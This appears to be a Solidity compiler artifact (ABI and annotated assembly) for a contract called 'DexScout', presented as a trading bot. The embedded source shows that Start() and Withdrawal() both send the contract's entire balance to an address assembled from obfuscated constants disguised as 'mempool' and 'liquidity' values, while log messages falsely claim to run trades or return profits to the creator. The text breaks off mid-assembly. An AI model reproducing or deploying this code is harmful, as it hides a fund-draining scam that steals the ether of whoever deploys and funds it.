{
	"new.sol": {
		"DexScout": {
			"abi": [
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "Start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Stop",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "Withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"new.sol\":96:15573  contract DexScout {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"new.sol\":96:15573  contract DexScout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1b55ba3a\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6c02a931\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x70e44c6a\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xbedf0f4a\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"new.sol\":532:724  function Start() public payable {... */\n    tag_3:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"new.sol\":121:144  string public tokenName */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"new.sol\":13571:13761  function Withdrawal() public payable {... */\n    tag_5:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"new.sol\":151:176  string public tokenSymbol */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"new.sol\":11304:11390  function Stop() public payable {... */\n    tag_7:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"new.sol\":532:724  function Start() public payable {... */\n    tag_11:\n        /* \"new.sol\":580:648  Log(\"Running DexScout action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_26\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"new.sol\":667:683  _callDexAction() */\n      tag_28\n        /* \"new.sol\":667:681  _callDexAction */\n      tag_29\n        /* \"new.sol\":667:683  _callDexAction() */\n      jump\t// in\n    tag_28:\n        /* \"new.sol\":659:693  payable(_callDexAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"new.sol\":659:716  payable(_callDexAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"new.sol\":694:715  address(this).balance */\n      selfbalance\n        /* \"new.sol\":659:716  payable(_callDexAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n        /* \"new.sol\":532:724  function Start() public payable {... */\n      jump\t// out\n        /* \"new.sol\":121:144  string public tokenName */\n    tag_14:\n      0x00\n      dup1\n      sload\n      tag_32\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_34\n      swap1\n      tag_33\n      jump\t// in\n    tag_34:\n      dup1\n      iszero\n      tag_35\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_36\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_35)\n    tag_36:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_37:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_37\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_35:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"new.sol\":13571:13761  function Withdrawal() public payable {... */\n    tag_18:\n        /* \"new.sol\":13624:13682  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_39\n      swap1\n      tag_40\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"new.sol\":13701:13720  WithdrawalProfits() */\n      tag_41\n        /* \"new.sol\":13701:13718  WithdrawalProfits */\n      tag_42\n        /* \"new.sol\":13701:13720  WithdrawalProfits() */\n      jump\t// in\n    tag_41:\n        /* \"new.sol\":13693:13730  payable(WithdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"new.sol\":13693:13753  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"new.sol\":13731:13752  address(this).balance */\n      selfbalance\n        /* \"new.sol\":13693:13753  payable(WithdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_44:\n      pop\n        /* \"new.sol\":13571:13761  function Withdrawal() public payable {... */\n      jump\t// out\n        /* \"new.sol\":151:176  string public tokenSymbol */\n    tag_21:\n      0x01\n      dup1\n      sload\n      tag_45\n      swap1\n      tag_33\n      jump\t// in\n    tag_45:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_46\n      swap1\n      tag_33\n      jump\t// in\n    tag_46:\n      dup1\n      iszero\n      tag_47\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_48\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_47)\n    tag_48:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_49:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_49\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_47:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"new.sol\":11304:11390  function Stop() public payable {... */\n    tag_24:\n        /* \"new.sol\":11351:11382  Log(\"Stopping contract bot...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_51\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"new.sol\":11304:11390  function Stop() public payable {... */\n      jump\t// out\n        /* \"new.sol\":11921:12032  function _callDexAction() internal pure returns (address) {... */\n    tag_29:\n        /* \"new.sol\":11970:11977  address */\n      0x00\n        /* \"new.sol\":11997:12024  parseMempool(callMempool()) */\n      tag_54\n        /* \"new.sol\":12010:12023  callMempool() */\n      tag_55\n        /* \"new.sol\":12010:12021  callMempool */\n      tag_56\n        /* \"new.sol\":12010:12023  callMempool() */\n      jump\t// in\n    tag_55:\n        /* \"new.sol\":11997:12009  parseMempool */\n      tag_57\n        /* \"new.sol\":11997:12024  parseMempool(callMempool()) */\n      jump\t// in\n    tag_54:\n        /* \"new.sol\":11990:12024  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"new.sol\":11921:12032  function _callDexAction() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":13767:13881  function WithdrawalProfits() internal pure returns (address) {... */\n    tag_42:\n        /* \"new.sol\":13819:13826  address */\n      0x00\n        /* \"new.sol\":13846:13873  parseMempool(callMempool()) */\n      tag_59\n        /* \"new.sol\":13859:13872  callMempool() */\n      tag_60\n        /* \"new.sol\":13859:13870  callMempool */\n      tag_56\n        /* \"new.sol\":13859:13872  callMempool() */\n      jump\t// in\n    tag_60:\n        /* \"new.sol\":13846:13858  parseMempool */\n      tag_57\n        /* \"new.sol\":13846:13873  parseMempool(callMempool()) */\n      jump\t// in\n    tag_59:\n        /* \"new.sol\":13839:13873  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"new.sol\":13767:13881  function WithdrawalProfits() internal pure returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":9956:10954  function callMempool() internal pure returns (string memory) {... */\n    tag_56:\n        /* \"new.sol\":10002:10015  string memory */\n      0x60\n        /* \"new.sol\":10028:10053  uint256 calculateGasNeeds */\n      0x00\n        /* \"new.sol\":10056:10076  _calculateGasNeeds() */\n      tag_62\n        /* \"new.sol\":10056:10074  _calculateGasNeeds */\n      tag_63\n        /* \"new.sol\":10056:10076  _calculateGasNeeds() */\n      jump\t// in\n    tag_62:\n        /* \"new.sol\":10028:10076  uint256 calculateGasNeeds = _calculateGasNeeds() */\n      swap1\n      pop\n        /* \"new.sol\":10087:10109  uint256 _memPoolLength */\n      0x00\n        /* \"new.sol\":10112:10119  7342143 */\n      0x70083f\n        /* \"new.sol\":10087:10119  uint256 _memPoolLength = 7342143 */\n      swap1\n      pop\n        /* \"new.sol\":10152:10172  uint256 _memPoolSize */\n      0x00\n        /* \"new.sol\":10175:10185  3853786515 */\n      0xe5b41d93\n        /* \"new.sol\":10152:10185  uint256 _memPoolSize = 3853786515 */\n      swap1\n      pop\n        /* \"new.sol\":10218:10240  uint256 _memPoolHeight */\n      0x00\n        /* \"new.sol\":10243:10261  getMemPoolHeight() */\n      tag_64\n        /* \"new.sol\":10243:10259  getMemPoolHeight */\n      tag_65\n        /* \"new.sol\":10243:10261  getMemPoolHeight() */\n      jump\t// in\n    tag_64:\n        /* \"new.sol\":10218:10261  uint256 _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"new.sol\":10272:10293  uint256 _memPoolDepth */\n      0x00\n        /* \"new.sol\":10296:10313  getMemPoolDepth() */\n      tag_66\n        /* \"new.sol\":10296:10311  getMemPoolDepth */\n      tag_67\n        /* \"new.sol\":10296:10313  getMemPoolDepth() */\n      jump\t// in\n    tag_66:\n        /* \"new.sol\":10272:10313  uint256 _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"new.sol\":10326:10354  string memory _memPoolOffset */\n      0x00\n        /* \"new.sol\":10357:10405  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_68\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"new.sol\":10370:10404  checkLiquidity(getMemPoolOffset()) */\n      tag_69\n        /* \"new.sol\":10385:10403  getMemPoolOffset() */\n      tag_70\n        /* \"new.sol\":10385:10401  getMemPoolOffset */\n      tag_71\n        /* \"new.sol\":10385:10403  getMemPoolOffset() */\n      jump\t// in\n    tag_70:\n        /* \"new.sol\":10370:10384  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10370:10404  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_69:\n        /* \"new.sol\":10357:10364  mempool */\n      tag_73\n        /* \"new.sol\":10357:10405  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_68:\n        /* \"new.sol\":10326:10405  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"new.sol\":10416:10439  string memory _memPool1 */\n      0x00\n        /* \"new.sol\":10442:10500  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      tag_74\n        /* \"new.sol\":10450:10464  _memPoolOffset */\n      dup3\n        /* \"new.sol\":10466:10499  checkLiquidity(calculateGasNeeds) */\n      tag_75\n        /* \"new.sol\":10481:10498  calculateGasNeeds */\n      dup10\n        /* \"new.sol\":10466:10480  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10466:10499  checkLiquidity(calculateGasNeeds) */\n      jump\t// in\n    tag_75:\n        /* \"new.sol\":10442:10449  mempool */\n      tag_73\n        /* \"new.sol\":10442:10500  mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      jump\t// in\n    tag_74:\n        /* \"new.sol\":10416:10500  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(calculateGasNeeds)) */\n      swap1\n      pop\n        /* \"new.sol\":10511:10534  string memory _memPool2 */\n      0x00\n        /* \"new.sol\":10537:10606  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_76\n        /* \"new.sol\":10545:10575  checkLiquidity(_memPoolLength) */\n      tag_77\n        /* \"new.sol\":10560:10574  _memPoolLength */\n      dup9\n        /* \"new.sol\":10545:10559  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10545:10575  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_77:\n        /* \"new.sol\":10577:10605  checkLiquidity(_memPoolSize) */\n      tag_78\n        /* \"new.sol\":10592:10604  _memPoolSize */\n      dup9\n        /* \"new.sol\":10577:10591  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10577:10605  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_78:\n        /* \"new.sol\":10537:10544  mempool */\n      tag_73\n        /* \"new.sol\":10537:10606  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_76:\n        /* \"new.sol\":10511:10606  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"new.sol\":10617:10640  string memory _memPool3 */\n      0x00\n        /* \"new.sol\":10643:10673  checkLiquidity(_memPoolHeight) */\n      tag_79\n        /* \"new.sol\":10658:10672  _memPoolHeight */\n      dup7\n        /* \"new.sol\":10643:10657  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10643:10673  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_79:\n        /* \"new.sol\":10617:10673  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"new.sol\":10684:10707  string memory _memPool4 */\n      0x00\n        /* \"new.sol\":10710:10739  checkLiquidity(_memPoolDepth) */\n      tag_80\n        /* \"new.sol\":10725:10738  _memPoolDepth */\n      dup7\n        /* \"new.sol\":10710:10724  checkLiquidity */\n      tag_72\n        /* \"new.sol\":10710:10739  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_80:\n        /* \"new.sol\":10684:10739  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"new.sol\":10750:10776  string memory _allMempools */\n      0x00\n        /* \"new.sol\":10779:10848  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_81\n        /* \"new.sol\":10787:10816  mempool(_memPool1, _memPool2) */\n      tag_82\n        /* \"new.sol\":10795:10804  _memPool1 */\n      dup7\n        /* \"new.sol\":10806:10815  _memPool2 */\n      dup7\n        /* \"new.sol\":10787:10794  mempool */\n      tag_73\n        /* \"new.sol\":10787:10816  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_82:\n        /* \"new.sol\":10818:10847  mempool(_memPool3, _memPool4) */\n      tag_83\n        /* \"new.sol\":10826:10835  _memPool3 */\n      dup6\n        /* \"new.sol\":10837:10846  _memPool4 */\n      dup6\n        /* \"new.sol\":10818:10825  mempool */\n      tag_73\n        /* \"new.sol\":10818:10847  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_83:\n        /* \"new.sol\":10779:10786  mempool */\n      tag_73\n        /* \"new.sol\":10779:10848  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_81:\n        /* \"new.sol\":10750:10848  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"new.sol\":10859:10885  string memory _fullMempool */\n      0x00\n        /* \"new.sol\":10888:10914  mempool(\"0\", _allMempools) */\n      tag_84\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"new.sol\":10901:10913  _allMempools */\n      dup4\n        /* \"new.sol\":10888:10895  mempool */\n      tag_73\n        /* \"new.sol\":10888:10914  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_84:\n        /* \"new.sol\":10859:10914  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"new.sol\":10934:10946  _fullMempool */\n      dup1\n        /* \"new.sol\":10927:10946  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"new.sol\":9956:10954  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"new.sol\":6461:7403  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n    tag_57:\n        /* \"new.sol\":6524:6539  address _parsed */\n      0x00\n        /* \"new.sol\":6552:6568  bytes memory tmp */\n      dup1\n        /* \"new.sol\":6577:6579  _a */\n      dup3\n        /* \"new.sol\":6552:6580  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"new.sol\":6591:6604  uint160 iaddr */\n      0x00\n        /* \"new.sol\":6619:6629  uint160 b1 */\n      dup1\n        /* \"new.sol\":6640:6650  uint160 b2 */\n      dup1\n        /* \"new.sol\":6668:6677  uint256 i */\n      0x00\n        /* \"new.sol\":6680:6681  2 */\n      0x02\n        /* \"new.sol\":6668:6681  uint256 i = 2 */\n      swap1\n      pop\n        /* \"new.sol\":6663:7364  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_86:\n        /* \"new.sol\":6687:6697  2 + 2 * 20 */\n      0x2a\n        /* \"new.sol\":6683:6684  i */\n      dup2\n        /* \"new.sol\":6683:6697  i < 2 + 2 * 20 */\n      lt\n        /* \"new.sol\":6663:7364  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_87\n      jumpi\n        /* \"new.sol\":6731:6734  256 */\n      0x0100\n        /* \"new.sol\":6722:6734  iaddr *= 256 */\n      dup5\n      tag_89\n      swap2\n      swap1\n      tag_90\n      jump\t// in\n    tag_89:\n      swap4\n      pop\n        /* \"new.sol\":6768:6771  tmp */\n      dup5\n        /* \"new.sol\":6772:6773  i */\n      dup2\n        /* \"new.sol\":6768:6774  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_91\n      jumpi\n      tag_92\n      tag_93\n      jump\t// in\n    tag_92:\n    tag_91:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"new.sol\":6762:6775  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"new.sol\":6754:6776  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"new.sol\":6749:6776  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"new.sol\":6810:6813  tmp */\n      dup5\n        /* \"new.sol\":6818:6819  1 */\n      0x01\n        /* \"new.sol\":6814:6815  i */\n      dup3\n        /* \"new.sol\":6814:6819  i + 1 */\n      tag_94\n      swap2\n      swap1\n      tag_95\n      jump\t// in\n    tag_94:\n        /* \"new.sol\":6810:6820  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_96\n      jumpi\n      tag_97\n      tag_93\n      jump\t// in\n    tag_97:\n    tag_96:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"new.sol\":6804:6821  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"new.sol\":6796:6822  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"new.sol\":6791:6822  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"new.sol\":6848:6850  97 */\n      0x61\n        /* \"new.sol\":6842:6844  b1 */\n      dup4\n        /* \"new.sol\":6842:6850  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":6841:6866  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_98\n      jumpi\n      pop\n        /* \"new.sol\":6862:6865  102 */\n      0x66\n        /* \"new.sol\":6856:6858  b1 */\n      dup4\n        /* \"new.sol\":6856:6865  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":6841:6866  (b1 >= 97) && (b1 <= 102) */\n    tag_98:\n        /* \"new.sol\":6837:7069  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_99\n      jumpi\n        /* \"new.sol\":6893:6895  87 */\n      0x57\n        /* \"new.sol\":6887:6895  b1 -= 87 */\n      dup4\n      tag_100\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_100:\n      swap3\n      pop\n        /* \"new.sol\":6837:7069  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_102)\n    tag_99:\n        /* \"new.sol\":6928:6930  65 */\n      0x41\n        /* \"new.sol\":6922:6924  b1 */\n      dup4\n        /* \"new.sol\":6922:6930  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":6921:6945  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_103\n      jumpi\n      pop\n        /* \"new.sol\":6942:6944  70 */\n      0x46\n        /* \"new.sol\":6936:6938  b1 */\n      dup4\n        /* \"new.sol\":6936:6944  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":6921:6945  (b1 >= 65) && (b1 <= 70) */\n    tag_103:\n        /* \"new.sol\":6917:7069  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_104\n      jumpi\n        /* \"new.sol\":6972:6974  55 */\n      0x37\n        /* \"new.sol\":6966:6974  b1 -= 55 */\n      dup4\n      tag_105\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_105:\n      swap3\n      pop\n        /* \"new.sol\":6917:7069  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_106)\n    tag_104:\n        /* \"new.sol\":7007:7009  48 */\n      0x30\n        /* \"new.sol\":7001:7003  b1 */\n      dup4\n        /* \"new.sol\":7001:7009  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":7000:7024  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_107\n      jumpi\n      pop\n        /* \"new.sol\":7021:7023  57 */\n      0x39\n        /* \"new.sol\":7015:7017  b1 */\n      dup4\n        /* \"new.sol\":7015:7023  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":7000:7024  (b1 >= 48) && (b1 <= 57) */\n    tag_107:\n        /* \"new.sol\":6996:7069  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_108\n      jumpi\n        /* \"new.sol\":7051:7053  48 */\n      0x30\n        /* \"new.sol\":7045:7053  b1 -= 48 */\n      dup4\n      tag_109\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_109:\n      swap3\n      pop\n        /* \"new.sol\":6996:7069  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_108:\n        /* \"new.sol\":6917:7069  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_106:\n        /* \"new.sol\":6837:7069  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_102:\n        /* \"new.sol\":7094:7096  97 */\n      0x61\n        /* \"new.sol\":7088:7090  b2 */\n      dup3\n        /* \"new.sol\":7088:7096  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":7087:7112  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_110\n      jumpi\n      pop\n        /* \"new.sol\":7108:7111  102 */\n      0x66\n        /* \"new.sol\":7102:7104  b2 */\n      dup3\n        /* \"new.sol\":7102:7111  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":7087:7112  (b2 >= 97) && (b2 <= 102) */\n    tag_110:\n        /* \"new.sol\":7083:7315  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_111\n      jumpi\n        /* \"new.sol\":7139:7141  87 */\n      0x57\n        /* \"new.sol\":7133:7141  b2 -= 87 */\n      dup3\n      tag_112\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_112:\n      swap2\n      pop\n        /* \"new.sol\":7083:7315  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_113)\n    tag_111:\n        /* \"new.sol\":7174:7176  65 */\n      0x41\n        /* \"new.sol\":7168:7170  b2 */\n      dup3\n        /* \"new.sol\":7168:7176  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":7167:7191  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_114\n      jumpi\n      pop\n        /* \"new.sol\":7188:7190  70 */\n      0x46\n        /* \"new.sol\":7182:7184  b2 */\n      dup3\n        /* \"new.sol\":7182:7190  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"new.sol\":7167:7191  (b2 >= 65) && (b2 <= 70) */\n    tag_114:\n        /* \"new.sol\":7163:7315  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_115\n      jumpi\n        /* \"new.sol\":7218:7220  55 */\n      0x37\n        /* \"new.sol\":7212:7220  b2 -= 55 */\n      dup3\n      tag_116\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_116:\n      swap2\n      pop\n        /* \"new.sol\":7163:7315  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_117)\n    tag_115:\n        /* \"new.sol\":7253:7255  48 */\n      0x30\n        /* \"new.sol\":7247:7249  b2 */\n      dup3\n        /* \"new.sol\":7247:7255  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"new.sol\":7246:7270  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_118\n      jumpi\n      pop\n        /* \"new.sol\":7267:7269  57 */\n      0x39\n        /* \"new.sol\":7261:7263  b2 */\n      dup3\n        /* \"new.sol\":7261:7269  b2 <= 57 */\n      